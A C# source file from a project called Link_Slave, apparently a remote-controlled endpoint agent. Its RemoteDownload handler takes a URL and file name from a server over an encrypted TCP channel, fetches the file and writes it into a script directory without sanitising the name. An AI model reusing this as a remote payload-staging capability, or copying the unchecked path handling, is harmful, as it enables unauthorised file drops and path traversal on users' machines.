using System;
using System.IO;
using System.Net.Http;
using System.Text;

namespace Link_Slave.Worker
{
    internal static partial class Client
    {
        private static readonly HttpClient http_client = new();

        private static void RemoteDownload(ref Byte errorCode, ref Byte[] buffer)
        {
            Byte[] rawResponse;
            String downloadData;

            String formattedResult;
            Color responseColor;

            if (buffer.Length < 2)
            {
                formattedResult = "Failed to download file - Command data containing the target file name / url was missing";
                responseColor = Color.Red;

                Log.FastLog("RemoteDownload", $"Failed to download file - Command data containing the target file name / url was missing\nbuffer.Length was: {buffer.Length}", xLogSeverity.Error);

                goto SEND;
            }

            downloadData = Encoding.UTF8.GetString(buffer);

            //[0] = url, [1] = fileName
            String[] downloadDataParts = downloadData.Split(new Char[] { '§' }, 2);

            if (downloadDataParts.Length != 2)
            {
                formattedResult = "Failed to download file - An error occurred while parsing the url or name";
                responseColor = Color.Red;

                Log.FastLog("RemoteDownload", $"Failed to download file - An error occurred while parsing the url or name\ndownloadDataParts.Length was:{downloadDataParts.Length}", xLogSeverity.Error);

                goto SEND;
            }

            if (downloadDataParts[0].IndexOf('\u0005', 0, 1) != -1)
            {
                downloadDataParts[0] = downloadDataParts[0].Substring(1);
            }

            try
            {
                using HttpResponseMessage response = http_client.GetAsync(downloadDataParts[0]).Result;
                response.EnsureSuccessStatusCode();

                Byte[] responseData = response.Content.ReadAsByteArrayAsync().Result;

                File.WriteAllBytes(Path.Combine(CurrentConfig.ScriptDirectory, downloadDataParts[1]), responseData);

                formattedResult = "**Successfully uploaded file**";
                responseColor = Color.Blue;

                Log.FastLog("RemoteDownload", $"Successfully downloaded requested file from '{downloadDataParts[0]}' with name '{downloadDataParts[1]}'", xLogSeverity.Info);
            }
            catch (HttpRequestException e)
            {
                formattedResult = $"*Endpoint failed to download file*\n\n{e.Message}";
                responseColor = Color.Red;

                Log.FastLog("RemoteDownload", $"Failed to download requested file with the following error message: {e.Message}", xLogSeverity.Error);
            }

        SEND:
            rawResponse = ServerResponseBuilder(ref formattedResult, ref responseColor);

            AES_TCP.RefSend(ref errorCode, ref socket, ref rawResponse, CurrentConfig.AES_Key, CurrentConfig.HMAC_Key);
        }
    }
}